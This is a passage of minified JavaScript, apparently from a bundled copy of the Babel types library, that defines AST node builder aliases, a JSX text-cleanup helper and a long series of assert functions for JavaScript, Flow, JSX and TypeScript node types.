TSTypeQuery=C("tsTypeQuery"),Si1=QU.TSTypeLiteral=C("tsTypeLiteral"),Ti1=QU.TSArrayType=C("tsArrayType"),_i1=QU.TSTupleType=C("tsTupleType"),Ei1=QU.TSOptionalType=C("tsOptionalType"),ki1=QU.TSRestType=C("tsRestType"),bi1=QU.TSNamedTupleMember=C("tsNamedTupleMember"),vi1=QU.TSUnionType=C("tsUnionType"),fi1=QU.TSIntersectionType=C("tsIntersectionType"),xi1=QU.TSConditionalType=C("tsConditionalType"),hi1=QU.TSInferType=C("tsInferType"),yi1=QU.TSParenthesizedType=C("tsParenthesizedType"),gi1=QU.TSTypeOperator=C("tsTypeOperator"),mi1=QU.TSIndexedAccessType=C("tsIndexedAccessType"),ui1=QU.TSMappedType=C("tsMappedType"),ci1=QU.TSTemplateLiteralType=C("tsTemplateLiteralType"),li1=QU.TSLiteralType=C("tsLiteralType"),pi1=QU.TSExpressionWithTypeArguments=C("tsExpressionWithTypeArguments"),di1=QU.TSInterfaceDeclaration=C("tsInterfaceDeclaration"),ii1=QU.TSInterfaceBody=C("tsInterfaceBody"),ri1=QU.TSTypeAliasDeclaration=C("tsTypeAliasDeclaration"),ai1=QU.TSInstantiationExpression=C("tsInstantiationExpression"),ni1=QU.TSAsExpression=C("tsAsExpression"),si1=QU.TSSatisfiesExpression=C("tsSatisfiesExpression"),oi1=QU.TSTypeAssertion=C("tsTypeAssertion"),ti1=QU.TSEnumBody=C("tsEnumBody"),ei1=QU.TSEnumDeclaration=C("tsEnumDeclaration"),Xr1=QU.TSEnumMember=C("tsEnumMember"),Jr1=QU.TSModuleDeclaration=C("tsModuleDeclaration"),Qr1=QU.TSModuleBlock=C("tsModuleBlock"),Yr1=QU.TSImportType=C("tsImportType"),Wr1=QU.TSImportEqualsDeclaration=C("tsImportEqualsDeclaration"),Gr1=QU.TSExternalModuleReference=C("tsExternalModuleReference"),Hr1=QU.TSNonNullExpression=C("tsNonNullExpression"),zr1=QU.TSExportAssignment=C("tsExportAssignment"),$r1=QU.TSNamespaceExportDeclaration=C("tsNamespaceExportDeclaration"),Vr1=QU.TSTypeAnnotation=C("tsTypeAnnotation"),Kr1=QU.TSTypeParameterInstantiation=C("tsTypeParameterInstantiation"),Ur1=QU.TSTypeParameterDeclaration=C("tsTypeParameterDeclaration"),Zr1=QU.TSTypeParameter=C("tsTypeParameter"),qr1=QU.NumberLiteral=Q7.numberLiteral,Br1=QU.RegexLiteral=Q7.regexLiteral,Mr1=QU.RestProperty=Q7.restProperty,jr1=QU.SpreadProperty=Q7.spreadProperty});var K9=v((HX)=>{Object.defineProperty(HX,"__esModule",{value:!0});var jY=MY();Object.keys(jY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in HX&&HX[X]===jY[X])return;Object.defineProperty(HX,X,{enumerable:!0,get:function(){return jY[X]}})});var OY=HU();Object.keys(OY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in HX&&HX[X]===OY[X])return;Object.defineProperty(HX,X,{enumerable:!0,get:function(){return OY[X]}})})});var $U=v((zU)=>{Object.defineProperty(zU,"__esModule",{value:!0});zU.default=d61;var l61=K9(),p61=y1();function d61(X,J){let Q=X.value.split(/\r\n|\n|\r/),Y=0;for(let G=0;G<Q.length;G++)if(/[^ \t]/.exec(Q[G]))Y=G;let W="";for(let G=0;G<Q.length;G++){let H=Q[G],z=G===0,$=G===Q.length-1,V=G===Y,K=H.replace(/\t/g," ");if(!z)K=K.replace(/^ +/,"");if(!$)K=K.replace(/ +$/,"");if(K){if(!V)K+=" ";W+=K}}if(W)J.push((0,p61.inherits)((0,l61.stringLiteral)(W),X))}});var KU=v((VU)=>{Object.defineProperty(VU,"__esModule",{value:!0});VU.default=a61;var FY=F0(),r61=$U();function a61(X){let J=[];for(let Q=0;Q<X.children.length;Q++){let Y=X.children[Q];if((0,FY.isJSXText)(Y)){(0,r61.default)(Y,J);continue}if((0,FY.isJSXExpressionContainer)(Y))Y=Y.expression;if((0,FY.isJSXEmptyExpression)(Y))continue;J.push(Y)}return J}});var RY=v((UU)=>{Object.defineProperty(UU,"__esModule",{value:!0});UU.default=o61;var s61=I9();function o61(X){return!!(X&&s61.VISITOR_KEYS[X.type])}});var qU=v((ZU)=>{Object.defineProperty(ZU,"__esModule",{value:!0});ZU.default=XX1;var e61=RY();function XX1(X){if(!(0,e61.default)(X)){var J;let Q=(J=X==null?void 0:X.type)!=null?J:JSON.stringify(X);throw TypeError(`Not a valid node of type "${Q}"`)}}});var MU=v((BU)=>{Object.defineProperty(BU,"__esModule",{value:!0});BU.assertAccessor=D41;BU.assertAnyTypeAnnotation=y81;BU.assertArgumentPlaceholder=q71;BU.assertArrayExpression=YX1;BU.assertArrayPattern=J81;BU.assertArrayTypeAnnotation=g81;BU.assertArrowFunctionExpression=Q81;BU.assertAssignmentExpression=WX1;BU.assertAssignmentPattern=X81;BU.assertAwaitExpression=I81;BU.assertBigIntLiteral=P81;BU.assertBinary=c51;BU.assertBinaryExpression=GX1;BU.assertBindExpression=B71;BU.assertBlock=d51;BU.assertBlockParent=p51;BU.assertBlockStatement=VX1;BU.assertBooleanLiteral=_X1;BU.assertBooleanLiteralTypeAnnotation=u81;BU.assertBooleanTypeAnnotation=m81;BU.assertBreakStatement=KX1;BU.assertCallExpression=UX1;BU.assertCatchClause=ZX1;BU.assertClass=O41;BU.assertClassAccessorProperty=k81;BU.assertClassBody=Y81;BU.assertClassDeclaration=G81;BU.assertClassExpression=W81;BU.assertClassImplements=l81;BU.assertClassMethod=O81;BU.assertClassPrivateMethod=v81;BU.assertClassPrivateProperty=b81;BU.assertClassProperty=E81;BU.assertCompletionStatement=a51;BU.assertConditional=n51;BU.assertConditionalExpression=qX1;BU.assertContinueStatement=BX1;BU.assertDebuggerStatement=MX1;BU.assertDecimalLiteral=A71;BU.assertDeclaration=W41;BU.assertDeclareClass=p81;BU.assertDeclareExportAllDeclaration=e81;BU.assertDeclareExportDeclaration=t81;BU.assertDeclareFunction=d81;BU.assertDeclareInterface=i81;BU.assertDeclareModule=r81;BU.assertDeclareModuleExports=a81;BU.assertDeclareOpaqueType=s81;BU.assertDeclareTypeAlias=n81;BU.assertDeclareVariable=o81;BU.assertDeclaredPredicate=XJ1;BU.assertDecorator=M71;BU.assertDirective=zX1;BU.assertDirectiveLiteral=$X1;BU.assertDoExpression=j71;BU.assertDoWhileStatement=jX1;BU.assertEmptyStatement=OX1;BU.assertEmptyTypeAnnotation=UJ1;BU.assertEnumBody=S41;BU.assertEnumBooleanBody=gJ1;BU.assertEnumBooleanMember=lJ1;BU.assertEnumDeclaration=yJ1;BU.assertEnumDefaultedMember=iJ1;BU.assertEnumMember=T41;BU.assertEnumNumberBody=mJ1;BU.assertEnumNumberMember=pJ1;BU.assertEnumStringBody=uJ1;BU.assertEnumStringMember=dJ1;BU.assertEnumSymbolBody=cJ1;BU.assertExistsTypeAnnotation=JJ1;BU.assertExportAllDeclaration=H81;BU.assertExportDeclaration=R41;BU.assertExportDefaultDeclaration=z81;BU.assertExportDefaultSpecifier=O71;BU.assertExportNamedDeclaration=$81;BU.assertExportNamespaceSpecifier=S81;BU.assertExportSpecifier=V81;BU.assertExpression=u51;BU.assertExpressionStatement=FX1;BU.assertExpressionWrapper=t51;BU.assertFile=RX1;BU.assertFlow=N41;BU.assertFlowBaseAnnotation=I41;BU.assertFlowDeclaration=C41;BU.assertFlowPredicate=P41;BU.assertFlowType=L41;BU.assertFor=e51;BU.assertForInStatement=AX1;BU.assertForOfStatement=K81;BU.assertForStatement=DX1;BU.assertForXStatement=X41;BU.assertFunction=J41;BU.assertFunctionDeclaration=wX1;BU.assertFunctionExpression=NX1;BU.assertFunctionParameter=G41;BU.assertFunctionParent=Q41;BU.assertFunctionTypeAnnotation=QJ1;BU.assertFunctionTypeParam=YJ1;BU.assertGenericTypeAnnotation=WJ1;BU.assertIdentifier=LX1;BU.assertIfStatement=IX1;BU.assertImmutable=K41;BU.assertImport=C81;BU.assertImportAttribute=h81;BU.assertImportDeclaration=U81;BU.assertImportDefaultSpecifier=Z81;BU.assertImportExpression=M81;BU.assertImportNamespaceSpecifier=q81;BU.assertImportOrExportDeclaration=F41;BU.assertImportSpecifier=B81;BU.assertIndexedAccessType=rJ1;BU.assertInferredPredicate=GJ1;BU.assertInterfaceDeclaration=zJ1;BU.assertInterfaceExtends=HJ1;BU.assertInterfaceTypeAnnotation=$J1;BU.assertInterpreterDirective=HX1;BU.assertIntersectionTypeAnnotation=VJ1;BU.assertJSX=_41;BU.assertJSXAttribute=nJ1;BU.assertJSXClosingElement=sJ1;BU.assertJSXClosingFragment=V71;BU.assertJSXElement=oJ1;BU.assertJSXEmptyExpression=tJ1;BU.assertJSXExpressionContainer=eJ1;BU.assertJSXFragment=z71;BU.assertJSXIdentifier=J71;BU.assertJSXMemberExpression=Q71;BU.assertJSXNamespacedName=Y71;BU.assertJSXOpeningElement=W71;BU.assertJSXOpeningFragment=$71;BU.assertJSXSpreadAttribute=G71;BU.assertJSXSpreadChild=X71;BU.assertJSXText=H71;BU.assertLVal=z41;BU.assertLabeledStatement=CX1;BU.assertLiteral=V41;BU.assertLogicalExpression=kX1;BU.assertLoop=s51;BU.assertMemberExpression=bX1;BU.assertMetaProperty=j81;BU.assertMethod=Z41;BU.assertMiscellaneous=E41;BU.assertMixedTypeAnnotation=KJ1;BU.assertModuleDeclaration=m41;BU.assertModuleExpression=D71;BU.assertModuleSpecifier=A41;BU.assertNewExpression=vX1;BU.assertNoop=K71;BU.assertNullLiteral=TX1;BU.assertNullLiteralTypeAnnotation=c81;BU.assertNullableTypeAnnotation=ZJ1;BU.assertNumberLiteral=x41;BU.assertNumberLiteralTypeAnnotation=qJ1;BU.assertNumberTypeAnnotation=BJ1;BU.assertNumericLiteral=SX1;BU.assertObjectExpression=xX1;BU.assertObjectMember=q41;BU.assertObjectMethod=hX1;BU.assertObjectPattern=F81;BU.assertObjectProperty=yX1;BU.assertObjectTypeAnnotation=MJ1;BU.assertObjectTypeCallProperty=OJ1;BU.assertObjectTypeIndexer=FJ1;BU.assertObjectTypeInternalSlot=jJ1;BU.assertObjectTypeProperty=RJ1;BU.assertObjectTypeSpreadProperty=AJ1;BU.assertOpaqueType=DJ1;BU.assertOptionalCallExpression=_81;BU.assertOptionalIndexedAccessType=aJ1;BU.assertOptionalMemberExpression=T81;BU.assertParenthesizedExpression=cX1;BU.assertPattern=j41;BU.assertPatternLike=H41;BU.assertPipelineBareFunction=L71;BU.assertPipelinePrimaryTopicReference=I71;BU.assertPipelineTopicExpression=N71;BU.assertPlaceholder=U71;BU.assertPrivate=w41;BU.assertPrivateName=f81;BU.assertProgram=fX1;BU.assertProperty=B41;BU.assertPureish=Y41;BU.assertQualifiedTypeIdentifier=wJ1;BU.assertRecordExpression=F71;BU.assertRegExpLiteral=EX1;BU.assertRegexLiteral=h41;BU.assertRestElement=gX1;BU.assertRestProperty=y41;BU.assertReturnStatement=mX1;BU.assertScopable=l51;BU.assertSequenceExpression=uX1;BU.assertSpreadElement=R81;BU.assertSpreadProperty=g41;BU.assertStandardized=m51;BU.assertStatement=i51;BU.assertStaticBlock=x81;BU.assertStringLiteral=PX1;BU.assertStringLiteralTypeAnnotation=NJ1;BU.assertStringTypeAnnotation=LJ1;BU.assertSuper=A81;BU.assertSwitchCase=lX1;BU.assertSwitchStatement=pX1;BU.assertSymbolTypeAnnotation=IJ1;BU.assertTSAnyKeyword=x71;BU.assertTSArrayType=Q51;BU.assertTSAsExpression=w51;BU.assertTSBaseType=f41;BU.assertTSBigIntKeyword=y71;BU.assertTSBooleanKeyword=h71;BU.assertTSCallSignatureDeclaration=E71;BU.assertTSConditionalType=V51;BU.assertTSConstructSignatureDeclaration=k71;BU.assertTSConstructorType=o71;BU.assertTSDeclareFunction=S71;BU.assertTSDeclareMethod=T71;BU.assertTSEntityName=$41;BU.assertTSEnumBody=I51;BU.assertTSEnumDeclaration=C51;BU.assertTSEnumMember=P51;BU.assertTSExportAssignment=v51;BU.assertTSExpressionWithTypeArguments=O51;BU.assertTSExternalModuleReference=k51;BU.assertTSFunctionType=s71;BU.assertTSImportEqualsDeclaration=E51;BU.assertTSImportType=_51;BU.assertTSIndexSignature=f71;BU.assertTSIndexedAccessType=q51;BU.assertTSInferType=K51;BU.assertTSInstantiationExpression=D51;BU.assertTSInterfaceBody=R51;BU.assertTSInterfaceDeclaration=F51;BU.assertTSIntersectionType=$51;BU.assertTSIntrinsicKeyword=g71;BU.assertTSLiteralType=j51;BU.assertTSMappedType=B51;BU.assertTSMethodSignature=v71;BU.assertTSModuleBlock=T51;BU.assertTSModuleDeclaration=S51;BU.assertTSNamedTupleMember=H51;BU.assertTSNamespaceExportDeclaration=f51;BU.assertTSNeverKeyword=m71;BU.assertTSNonNullExpression=b51;BU.assertTSNullKeyword=u71;BU.assertTSNumberKeyword=c71;BU.assertTSObjectKeyword=l71;BU.assertTSOptionalType=W51;BU.assertTSParameterProperty=P71;BU.assertTSParenthesizedType=U51;BU.assertTSPropertySignature=b71;BU.assertTSQualifiedName=_71;BU.assertTSRestType=G51;BU.assertTSSatisfiesExpression=N51;BU.assertTSStringKeyword=p71;BU.assertTSSymbolKeyword=d71;BU.assertTSTemplateLiteralType=M51;BU.assertTSThisType=n71;BU.assertTSTupleType=Y51;BU.assertTSType=v41;BU.assertTSTypeAliasDeclaration=A51;BU.assertTSTypeAnnotation=x51;BU.assertTSTypeAssertion=L51;BU.assertTSTypeElement=b41;BU.assertTSTypeLiteral=J51;BU.assertTSTypeOperator=Z51;BU.assertTSTypeParameter=g51;BU.assertTSTypeParameterDeclaration=y51;BU.assertTSTypeParameterInstantiation=h51;BU.assertTSTypePredicate=e71;BU.assertTSTypeQuery=X51;BU.assertTSTypeReference=t71;BU.assertTSUndefinedKeyword=i71;BU.assertTSUnionType=z51;BU.assertTSUnknownKeyword=r71;BU.assertTSVoidKeyword=a71;BU.assertTaggedTemplateExpression=D81;BU.assertTemplateElement=w81;BU.assertTemplateLiteral=N81;BU.assertTerminatorless=r51;BU.assertThisExpression=dX1;BU.assertThisTypeAnnotation=CJ1;BU.assertThrowStatement=iX1;BU.assertTopicReference=w71;BU.assertTryStatement=rX1;BU.assertTupleExpression=R71;BU.assertTupleTypeAnnotation=PJ1;BU.assertTypeAlias=TJ1;BU.assertTypeAnnotation=_J1;BU.assertTypeCastExpression=EJ1;BU.assertTypeParameter=kJ1;BU.assertTypeParameterDeclaration=bJ1;BU.assertTypeParameterInstantiation=vJ1;BU.assertTypeScript=k41;BU.assertTypeofTypeAnnotation=SJ1;BU.assertUnaryExpression=aX1;BU.assertUnaryLike=M41;BU.assertUnionTypeAnnotation=fJ1;BU.assertUpdateExpression=nX1;BU.assertUserWhitespacable=U41;BU.assertV8IntrinsicIdentifier=Z71;BU.assertVariableDeclaration=sX1;BU.assertVariableDeclarator=oX1;BU.assertVariance=xJ1;BU.assertVoidPattern=C71;BU.assertVoidTypeAnnotation=hJ1;BU.assertWhile=o51;BU.assertWhileStatement=tX1;BU.assertWithStatement=eX1;BU.assertYieldExpression=L81;var QX1=u8(),Y7=m8();function A(X,J,Q){if(!(0,QX1.default)(X,J,Q))throw Error(`Expected type "${X}" with option ${JSON.stringify(Q)}, but instead got "${J.type}".`)}function YX1(X,J){A("ArrayExpression",X,J)}function WX1(X,J){A("AssignmentExpression",X,J)}function GX1(X,J){A("BinaryExpression",X,J)}function HX1(X,J){A("InterpreterDirective",X,J)}function zX1(X,J){A("Directive",X,J)}function $X1(X,J){A("DirectiveLiteral",X,J)}function VX1(X,J){A("BlockStatement",X,J)}function KX1(X,J){A("BreakStatement",X,J)}function UX1(X,J){A("CallExpression",X,J)}function ZX1(X,J){A("CatchClause",X,J)}function qX1(X,J){A("ConditionalExpression",X,J)}function BX1(X,J){A("ContinueStatement",X,J)}function MX1(X,J){A("DebuggerStatement",X,J)}function jX1(X,J){A("DoWhileStatement",X,J)}function OX1(X,J){A("EmptyStatement",X,J)}function FX1(X,J){A("ExpressionStatement",X,J)}function RX1(X,J){A("File",X,J)}function AX1(X,J){A("ForInStatement",X,J)}function DX1(X,J){A("ForStatement",X,J)}function wX1(X,J){A("FunctionDeclaration",X,J)}function NX1(X,J){A("FunctionExpression",X,J)}function LX1(X,J){A("Identifier",X,J)}function IX1(X,J){A("IfStatement",X,J)}function CX1(X,J){A("LabeledStatement",X,J)}function PX1(X,J){A("StringLiteral",X,J)}function SX1(X,J){A("NumericLiteral",X,J)}function TX1(X,J){A("NullLiteral",X,J)}function _X1(X,J){A("BooleanLiteral",X,J)}function EX1(X,J){A("RegExpLiteral",X,J)}function kX1(X,J){A("LogicalExpression",X,J)}function bX1(X,J){A("MemberExpression",X,J)}function vX1(X,J){A("NewExpression",X,J)}function fX1(X,J){A("Program",X,J)}function xX1(X,J){A("ObjectExpression",X,J)}function hX1(X,J){A("ObjectMethod",X,J)}function yX1(X,J){A("ObjectProperty",X,J)}function gX1(X,J){A("RestElement",X,J)}function mX1(X,J){A("ReturnStatement",X,J)}function uX1(X,J){A("SequenceExpression",X,J)}function cX1(X,J){A("ParenthesizedExpression",X,J)}function lX1(X,J){A("SwitchCase",X,J)}function pX1(X,J){A("SwitchStatement",X,J)}function dX1(X,J){A("ThisExpression",X,J)}function iX1(X,J){A("ThrowStatement",X,J)}function rX1(X,J){A("TryStatement",X,J)}function aX1(X,J){A("UnaryExpression",X,J)}function nX1(X,J){A("UpdateExpression",X,J)}function sX1(X,J){A("VariableDeclaration",X,J)}function oX1(X,J){A("VariableDeclarator",X,J)}function tX1(X,J){A("WhileStatement",X,J)}function eX1(X,J){A("WithStatement",X,J)}function X81(X,J){A("AssignmentPattern",X,J)}function J81(X,J){A("ArrayPattern",X,J)}function Q81(X,J){A("ArrowFunctionExpression",X,J)}function Y81(X,J){A("ClassBody",X,J)}function W81(X,J){A("ClassExpression",X,J)}function G81(X,J){A("ClassDeclaration",X,J)}function H81(X,J){A("ExportAllDeclaration",X,J)}function z81(X,J){A("ExportDefaultDeclaration",X,J)}function $81(X,J){A("ExportNamedDeclaration",X,J)}function V81(X,J){A("ExportSpecifier",X,J)}function K81(X,J){A("ForOfStatement",X,J)}function U81(X,J){A("ImportDeclaration",X,J)}function Z81(X,J){A("ImportDefaultSpecifier",X,J)}function q81(X,J){A("ImportNamespaceSpecifier",X,J)}function B81(X,J){A("ImportSpecifier",X,J)}function M81(X,J){A("ImportExpression",X,J)}function j81(X,J){A("MetaProperty",X,J)}function O81(X,J){A("ClassMethod",X,J)}function F81(X,J){A("ObjectPattern",X,J)}function R81(X,J){A("SpreadElement",X,J)}function A81(X,J){A("Super",X,J)}function D81(X,J){A("TaggedTemplateExpression",X,J)}function w81(X,J){A("TemplateElement",X,J)}function N81(X,J){A("TemplateLiteral",X,J)}function L81(X,J){A("YieldExpression",X,J)}function I81(X,J){A("AwaitExpression",X,J)}function C81(X,J){A("Import",X,J)}function P81(X,J){A("BigIntLiteral",X,J)}function S81(X,J){A("ExportNamespaceSpecifier",X,J)}function T81(X,J){A("OptionalMemberExpression",X,J)}function _81(X,J){A("OptionalCallExpression",X,J)}function E81(X,J){A("ClassProperty",X,J)}function k81(X,J){A("ClassAccessorProperty",X,J)}function b81(X,J){A("ClassPrivateProperty",X,J)}function v81(X,J){A("ClassPrivateMethod",X,J)}function f81(X,J){A("PrivateName",X,J)}function x81(X,J){A("StaticBlock",X,J)}function h81(X,J){A("ImportAttribute",X,J)}function y81(X,J){A("AnyTypeAnnotation",X,J)}function g81(X,J){A("ArrayTypeAnnotation",X,J)}function m81(X,J){A("BooleanTypeAnnotation",X,J)}function u81(X,J){A("BooleanLiteralTypeAnnotation",X,J)}function c81(X,J){A("NullLiteralTypeAnnotation",X,J)}function l81(X,J){A("ClassImplements",X,J)}function p81(X,J){A("DeclareClass",X,J)}function d81(X,J){A("DeclareFunction",X,J)}function i81(X,J){A("DeclareInterface",X,J)}function r81(X,J){A("DeclareModule",X,J)}function a81(X,J){A("DeclareModuleExports",X,J)}function n81(X,J){A("DeclareTypeAlias",X,J)}function s81(X,J){A("DeclareOpaqueType",X,J)}function o81(X,J){A("DeclareVariable",X,J)}function t81(X,J){A("DeclareExportDeclaration",X,J)}function e81(X,J){A("DeclareExportAllDeclaration",X,J)}function XJ1(X,J){A("DeclaredPredicate",X,J)}function JJ1(X,J){A("ExistsTypeAnnotation",X,J)}function QJ1(X,J){A("FunctionTypeAnnotation",X,J)}function YJ1(X,J){A("FunctionTypeParam",X,J)}function WJ1(X,J){A("GenericTypeAnnotation",X,J)}function GJ1(X,J){A("InferredPredicate",X,J)}function HJ1(X,J){A("InterfaceExtends",X,J)}function zJ1(X,J){A("InterfaceDeclaration",X,J)}function $J1(X,J){A("InterfaceTypeAnnotation",X,J)}function VJ1(X,J){A("IntersectionTypeAnnotation",X,J)}function KJ1(X,J){A("MixedTypeAnnotation",X,J)}function UJ1(X,J){A("EmptyTypeAnnotation",X,J)}function ZJ1(X,J){A("NullableTypeAnnotation",X,J)}function qJ1(X,J){A("NumberLiteralTypeAnnotation",X,J)}function BJ1(X,J){A("NumberTypeAnnotation",X,J)}function MJ1(X,J){A("ObjectTypeAnnotation",X,J)}function jJ1(X,J){A("ObjectTypeInternalSlot",X,J)}function OJ1(X,J){A("ObjectTypeCallProperty",X,J)}function FJ1(X,J){A("ObjectTypeIndexer",X,J)}function RJ1(X,J){A("ObjectTypeProperty",X,J)}function AJ1(X,J){A("ObjectTypeSpreadProperty",X,J)}function DJ1(X,J){A("OpaqueType",X,J)}function wJ1(X,J){A("QualifiedTypeIdentifier",X,J)}function NJ1(X,J){A("StringLiteralTypeAnnotation",X,J)}function LJ1(X,J){A("StringTypeAnnotation",X,J)}function IJ1(X,J){A("SymbolTypeAnnotation",X,J)}function CJ1(X,J){A("ThisTypeAnnotation",X,J)}function PJ1(X,J){A("TupleTypeAnnotation",X,J)}function SJ1(X,J){A("TypeofTypeAnnotation",X,J)}function TJ1(X,J){A("TypeAlias",X,J)}function _J1(X,J){A("TypeAnnotation",X,J)}function EJ1(X,J){A("TypeCastExpression",X,J)}function kJ1(X,J){A("TypeParameter",X,J)}function bJ1(X,J){A("TypeParameterDeclaration",X,J)}function vJ1(X,J){A("TypeParameterInstantiation",X,J)}function fJ1(X,J){A("UnionTypeAnnotation",X,J)}function xJ1(X,J){A("Variance",X,J)}function hJ1(X,J){A("VoidTypeAnnotation",X,J)}function yJ1(X,J){A("EnumDeclaration",X,J)}function gJ1(X,J){A("EnumBooleanBody",X,J)}function mJ1(X,J){A("EnumNumberBody",X,J)}function uJ1(X,J){A("EnumStringBody",X,J)}function cJ1(X,J){A("EnumSymbolBody",X,J)}function lJ1(X,J){A("EnumBooleanMember",X,J)}function pJ1(X,J){A("EnumNumberMember",X,J)}function dJ1(X,J){A("EnumStringMember",X,J)}function iJ1(X,J){A("EnumDefaultedMember",X,J)}function rJ1(X,J){A("IndexedAccessType",X,J)}function aJ1(X,J){A("OptionalIndexedAccessType",X,J)}function nJ1(X,J){A("JSXAttribute",X,J)}function sJ1(X,J){A("JSXClosingElement",X,J)}function oJ1(X,J){A("JSXElement",X,J)}function tJ1(X,J){A("JSXEmptyExpression",X,J)}function eJ1(X,J){A("JSXExpressionContainer",X,J)}function X71(X,J){A("JSXSpreadChild",X,J)}function J71(X,J){A("JSXIdentifier",X,J)}function Q71(X,J){A("JSXMemberExpression",X,J)}function Y71(X,J){A("JSXNamespacedName",X,J)}function W71(X,J){A("JSXOpeningElement",X,J)}function G71(X,J){A("JSXSpreadAttribute",X,J)}function H71(X,J){A("JSXText",X,J)}function z71(X,J){A("JSXFragment",X,J)}function $71(X,J){A("JSXOpeningFragment",X,J)}function V71(X,J){A("JSXClosingFragment",X,J)}function K71(X,J){A("Noop",X,J)}function U71(X,J){A("Placeholder",X,J)}function Z71(X,J){A("V8IntrinsicIdentifier",X,J)}function q71(X,J){A("ArgumentPlaceholder",X,J)}function B71(X,J){A("BindExpression",X,J)}function M71(X,J){A("Decorator",X,J)}function j71(X,J){A("DoExpression",X,J)}function O71(X,J){A("ExportDefaultSpecifier",X,J)}function F71(X,J){A("RecordExpression",X,J)}function R71(X,J){A("TupleExpression",X,J)}function A71(X,J){A("DecimalLiteral",X,J)}function D71(X,J){A("ModuleExpression",X,J)}function w71(X,J){A("TopicReference",X,J)}function N71(X,J){A("PipelineTopicExpression",X,J)}function L71(X,J){A("PipelineBareFunction",X,J)}function I71(X,J){A("PipelinePrimaryTopicReference",X,J)}function C71(X,J){A("VoidPattern",X,J)}function P71(X,J){A("TSParameterProperty",X,J)}function S71(X,J){A("TSDeclareFunction",X,J)}function T71(X,J){A("TSDeclareMethod",X,J)}function _71(X,J){A("TSQualifiedName",X,J)}function E71(X,J){A("TSCallSignatureDeclaration",X,J)}function k71(X,J){A("TSConstructSignatureDeclaration",X,J)}function b71(X,J){A("TSPropertySignature",X,J)}function v71(X,J){A("TSMethodSignature",X,J)}function f71(X,J){A("TSIndexSignature",X,J)}function x71(X,J){A("TSAnyKeyword",X,J)}function h71(X,J){A("TSBooleanKeyword",X,J)}function y71(X,J){A("TSBigIntKeyword",X,J)}function g71(X,J){A("TSIntrinsicKeyword",X,J)}function m71(X,J){A("TSNeverKeyword",X,J)}function u71(X,J){A("TSNullKeyword",X,J)}function c71(X,J){A("TSNumberKeyword",X,J)}function l71(X,J){A("TSObjectKeyword",X,J)}function p71(X,J){A("TSStringKeyword",X,J)}function d71(X,J){A("TSSymbolKeyword",X,J)}function i71(X,J){A("TSUndefinedKeyword",X,J)}function r71(X,J){A("TSUnknownKeyword",X,J)}function a71(X,J){A("TSVoidKeyword",X,J)}function n71(X,J){A("TSThisType",X,J)}function s71(X,J){A("TSFunctionType",X,J)}function o71(X,J){A("TSConstructorType",X,J)}function t71(X,J){A("TSTypeReference",X,J)}function e71(X,J){A("TSTypePredicate",X,J)}function X51(X,J){A("TSTypeQuery",X,J)}function J51(X,J){A("TSTypeLiteral",X,J)}function Q51(X,J){A("TSArrayType",X,J)}function Y51(X,J){A("TSTupleType",X,J)}function W51(X,J){A("TSOptionalType",X,J)}function G51(X,J){A("TSRestType",X,J)}function H51(X,J){A("TSNamedTupleMember",X,J)}function z51(X,J){A("TSUnionType",X,J)}function $51(X,J){A("TSIntersectionType",X,J)}function V51(X,J){A("TSConditionalType",X,J)}function K51(X,J){A("TSInferType",X,J)}function U51(X,J){A("TSParenthesizedType",X,J)}function Z51(X,J){A("TSTypeOperator",X,J)}function q51(X,J){A("TSIndexedAccessType",X,J)}function B51(X,J){A("TSMappedType",X,J)}function M51(X,J){A("TSTemplateLiteralType",X,J)}function j51(X,J){A("TSLiteralType",X,J)}function O51(X,J){A("TSExpressionWithTypeArguments",X,J)}function F51(X,J){A("TSInterfaceDeclaration",X,J)}function R51(X,J){A("TSInterfaceBody",X,J)}function A51(X,J){A("TSTypeAliasDeclaration",X,J)}function D51(X,J){A("TSInstantiationExpression",X,J)}function w51(X,J){A("TSAsExpression",X,J)}function N51(X,J){A("TSSatisfiesExpression",X,J)}function L51(X,J){A("TSTypeAssertion",X,J)}function I51(X,J){A("TSEnumBody",X,J)}function C51(X,J){A("TSEnumDeclaration",X,J)}function P51(X,J){A("TSEnumMember",X,J)}function S51(X,J){A("TSModuleDeclaration",X,J)}function T51(X,J){A("TSModuleBlock",X,J)}function _51(X,J){A("TSImportType",X,J)}function E51(X,J){A("TSImportEqualsDeclaration",X,J)}function k51(X,J){A("TSExternalModuleReference",X,J)}function b51(X,J){A("TSNonNullExpression",X,J)}function v51(X,J){A("TSExportAssignment",X,J)}function f51(X,J){A("TSNamespaceExportDeclaration",X,J)}function x51(X,J){A("TSTypeAnnotation",X,J)}function h51(X,J){A("TSTypeParameterInstantiation",X,J)}function y51(X,J){A("TSTypeParameterDeclaration",X,J)}function g51(X,J){A("TSTypeParameter",X,J)}function m51(X,J){A("Standardized",X,J)}function u51(X,J){A("Expression",X,J)}function c51(X,J){A("Binary",X,J)}function l51(X,J){A("Scopable",X,J)}function p51(X,J){A("BlockParent",X,J)}function d51(X,J){A("Block",X,J)}function i51(X,J){A("Statement",X,J)}function r51(X,J){A("Terminatorless",X,J)}function a51(X,J){A("CompletionStatement",X,J)}function n51(X,J){A("Conditional",X,J)}function s51(X,J){A("Loop",X,J)}function o51(X,J){A("While",X,J)}function t51(X,J){A("ExpressionWrapper",X,J)}function e51(X,J){A("For",X,J)}function X41(X,J){A("ForXStatement",X,J)}function J41(X,J){A("Function",X,J)}function Q41(X,J){A("FunctionParent",X,J)}function Y41(X,J){A("Pureish",X,J)}function W41(X,J){A("Declaration",X,J)}function G41(X,J){A("FunctionParameter",X,J)}function H41(X,J){A("PatternLike",X,J)}function z41(X,J){A("LVal",X,J)}function $41(X,J){A("TSEntityName",X,J)}function V41(X,J){A("Literal",X,J)}function K41(X,J){A("Immutable",X,J)}function U41(X,J){A("UserWhitespacable",X,J)}function Z41(X,J){A("Method",X,J)}function q41(X,J){A("ObjectMember",X,J)}function B41(X,J){A("Property",X,J)}function M41(X,J){A("UnaryLike",X,J)}function j41(X,J){A("Pattern",X,J)}function O41(X,J){A("Class",X,J)}function F41(X,J){A("ImportOrExportDeclaration",X,J)}function R41(X,J){A("ExportDeclaration",X,J)}function A41(X,J){A("ModuleSpecifier",X,J)}function D41(X,J){A("Accessor",X,J)}function w41(X,J){A("Private",X,J)}function N41(X,J){A("Flow",X,J)}function L41(X,J){A("FlowType",X,J)}function I41(X,J){A("FlowBaseAnnotation",X,J)}function C41(X,J){A("FlowDeclaration",X,J)}function P41(X,J){A("FlowPredicate",X,J)}function S41(X,J){A("EnumBody",X,J)}function T41(X,J){A("EnumMember",X,J)}function 